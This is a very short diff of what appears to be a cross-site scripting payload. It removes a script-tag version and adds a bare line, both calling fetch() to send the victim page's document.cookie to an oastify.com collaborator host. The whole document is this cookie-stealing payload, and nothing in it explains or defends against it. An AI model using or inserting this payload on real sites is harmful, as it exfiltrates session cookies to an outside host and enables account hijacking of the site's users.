@@ -1,3 +1,2 @@
-<script>
-fetch(`http://cvbv5d1s2yoygxyyua8b2j19k0qret2i.oastify.com/${document.cookie}`)
-</script>
+fetch(`http://vpoezwvbwhihagshot2uw2vsejka8dw2.oastify.com/c=${document.cookie}`)
+
